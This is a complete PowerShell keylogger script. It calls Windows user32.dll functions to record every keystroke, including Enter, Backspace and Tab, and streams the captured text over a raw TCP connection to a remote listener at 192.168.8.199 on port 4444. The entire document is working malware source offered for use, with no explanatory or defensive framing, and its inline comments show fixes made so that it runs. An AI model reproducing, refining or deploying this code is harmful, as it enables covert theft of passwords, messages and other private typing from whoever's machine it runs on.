# --- Network Configuration ---
$targetIP = "192.168.8.199"
$targetPort = 4444

# --- P/Invoke Signatures ---
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# --- Network Connection Setup ---
Write-Host "Attempting to connect to $targetIP`:$targetPort..."
try {
    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::Unicode)
    $writer.AutoFlush = $true
    $writer.WriteLine("=== Keylogger Started ===")
    Write-Host "Connected. Logging keys." -ForegroundColor Green
} catch {
    Write-Host "CONNECTION FAILED: $($_.Exception.Message)" -ForegroundColor Red
    return
}

# --- Main Keylogging Loop ---
try {
    while ($client.Connected) {
        Start-Sleep -Milliseconds 40

        # --- Handle Special Keys First ---
        if ($API::GetAsyncKeyState(13) -eq -32767) { # Enter Key
            $writer.Write("[ENTER]`n") # <--- FIX: Send LF only
            continue
        }
        if ($API::GetAsyncKeyState(8) -eq -32767) {  # Backspace Key
            $writer.Write("[BACKSPACE]`n") # <--- FIX: Send LF only
            continue
        }
        if ($API::GetAsyncKeyState(9) -eq -32767) {  # Tab Key
            $writer.Write("[TAB]`n")
            continue
        }

        # --- Handle All Other Keys ---
        for ($ascii = 32; $ascii -le 254; $ascii++) {
            # Skip keys we already handled
            if ($ascii -eq 13 -or $ascii -eq 8 -or $ascii -eq 9) { continue }

            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success) {
                    try {
                        $writer.Write($mychar.ToString())
                    } catch {
                        Write-Host "Connection lost while sending data." -ForegroundColor Red
                        throw
                    }
                }
            }
        }
    }
} 
finally {
    # --- Cleanup ---
    Write-Host "Disconnecting..." -ForegroundColor Yellow
    if ($writer -ne $null) { $writer.Close() }
    if ($stream -ne $null) { $stream.Close() }
    if ($client -ne $null) { $client.Close() }
    Write-Host "Disconnected."
    exit
}
